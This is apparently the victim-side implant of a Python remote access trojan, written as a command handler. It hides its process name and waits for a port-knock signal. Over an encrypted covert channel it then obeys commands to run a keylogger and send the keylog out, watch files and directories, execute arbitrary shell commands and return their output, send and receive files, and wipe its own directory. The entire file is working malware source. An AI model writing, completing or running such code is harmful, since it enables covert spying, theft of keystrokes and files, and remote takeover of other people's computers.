import argparse
from keylogger import *
from watcher import *
from portknocker import port_knocking
from processname import choose_process_name
import setproctitle
from utils import get_ip_address, transfer_keylog_file, check_exists
import shutil

def handle_command(command: int, keylogger, watcher, covert):
    if command == 0:
        return 0
    print(f"VICTIM:: Command Received", end=" ")

    if command == 1:
        print("VICTIM:: Received command to start the keylog program...")
        keylogger.start_keylogger()
        return 1

    elif command == 2:
        print("VICTIM:: Received command to stop the keylog program...")
        if not keylogger.get_status():
            print("VICTIM:: Keylogger is not running.")
            return 2
        val = keylogger.stop_keylogger()
        if val == 0:
            print("VICTIM:: Keylogger has been stopped.")
        return 2

    elif command == 3:
        print("VICTIM:: Received command to transfer the keylog file...")
        return transfer_keylog_file(keylogger, covert, "keylog.txt")

    elif command == 4:
        print(f"VICTIM:: Received command to watch file...")
        file = covert.receive_data(for_victim=True)
        i = check_exists(file)
        if not i or watcher.get_status():
            covert.cmd = 0
            covert.send_data(for_victim=False)
            covert.cmd = None
            if not watcher.init_watcher():
                print("VICTIM:: Error, Watcher already running")
                return 7
            elif not i:
                print("VICTIM:: File Path Not Found")
                return 7
        covert.cmd = 1
        covert.send_data(for_victim=False)
        covert.cmd = None
        watcher.toggle_file()
        watcher.start_watching(covert, file)
        return 7

    elif command == 5:
        print(f"VICTIM:: Received command to stop the watch file...")
        if not watcher.get_status():
            print("VICTIM:: Cannot stop the watcher, not Watching a File")
            return 5
        val = watcher.stop_watching()
        return 5
    
    elif command == 6:
        
        print(f"VICTIM:: Received command to watch directory...")
        direc = covert.receive_data(for_victim=True)
        i = check_exists(direc)

        if not i or watcher.get_status():
            if not watcher.init_watcher():
                print("VICTIM:: Error, Watcher already running")
                covert.cmd = 0
                covert.send_data(for_victim=False)
                covert.cmd = None
                return 6
            elif not i:
                print("VICTIM:: Error, directory path not found")
                covert.cmd = 0
                covert.send_data(for_victim=False)
                covert.cmd = None
                return 6

        covert.cmd = 1
        covert.send_data(for_victim=False)
        covert.cmd = None
        watcher.toggle_dir()
        watcher.start_watching(covert, direc)
        return 6

    
    elif command == 7:
        print(f"VICTIM:: Received command to stop the watch directory...")
        if not watcher.get_status():
            print("VICTIM:: Error, Not Watching a Directory")
            return 7
        val = watcher.stop_watching()
        if val == 0:
            print(f'VICTIM:: Stopped watching the directory')
        return 7

    elif command == 8:
        print(f"VICTIM:: Received command to run a program...")
        prog = covert.receive_data(for_victim=True)
        try:
            output = subprocess.check_output(prog, shell=True, universal_newlines=True)
            if output:
                covert.cmd = output
            else:
                covert.cmd = 1
            covert.send_data(for_victim=False)

        except subprocess.CalledProcessError as e:
            print(f"Error: {e}")
            covert.cmd = 0
            covert.send_data(for_victim=False)

        covert.cmd = None
        return 8

    elif command == 9:
        print(f"VICTIM:: Received command to send a file...")
        file = covert.receive_data(for_victim=True)
        if check_exists(file):
            covert.cmd = None
            covert.file_name = file
            covert.send_data(for_victim=False, event="IN_CREATE")
            covert.file_name = None
        else:
            print(f"VICTIM:: {file} does not exist")
        return 9


    elif command == 10:
        print(f"VICTIM:: Receiving a file from the commander...")
        
        covert.receive_data(for_victim=True)
        
        covert.cmd = 1
        covert.send_data(for_victim=False)
        covert.cmd = None
        return 10


    elif command == 11:
        print("VICTIM:: Disconnecting")
        return 11

    elif command == 12:
        print("VICTIM:: Tearing down from the victim...")
        current_directory = os.getcwd()
        shutil.rmtree(current_directory)
        return 12

    else:
        print("VICTIM:: Error, Unknown command")
        return 13


def main():
    proc_name = choose_process_name()
    setproctitle.setproctitle(proc_name)

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port', type=int, dest='port', default=6000)
    args = parser.parse_args()
    
    keylogger_instance = Keylogger()
    watcher_instance = Watcher()

    victim_ip = get_ip_address()
    victim_port = args.port

    while True:
        print(f"\n---WAITING FOR PORT KNOCK---")
        cmd_ip, cmd_port = port_knocking(get_ip_address())
        print(f"\n---FOUND THE COMMANDER {cmd_ip, cmd_port}---")

        letters = input("ENTER KEY FOR ENCRYPTION: ")
        key = bytes(letters.encode('ascii'))

        covert_channel = CovertChannel(
            victim_addr=victim_ip, 
            victim_port=victim_port, 
            cmd_addr=cmd_ip,
            cmd_port=cmd_port, key=key
        )
        
        while True:
            try:
                print(f"\n---WAITING FOR CMD FROM THE COMMANDER---")
                command = int(covert_channel.receive_data(for_victim=True))
            except KeyboardInterrupt as e:
                print(f"Error {e}")
            
            else:
                result = handle_command(command, keylogger_instance, watcher_instance, covert_channel)
                if result == 11 or result == 0:
                    print("VICTIM:: DISCONNECTING")
                    break


if __name__ == "__main__":
    main()
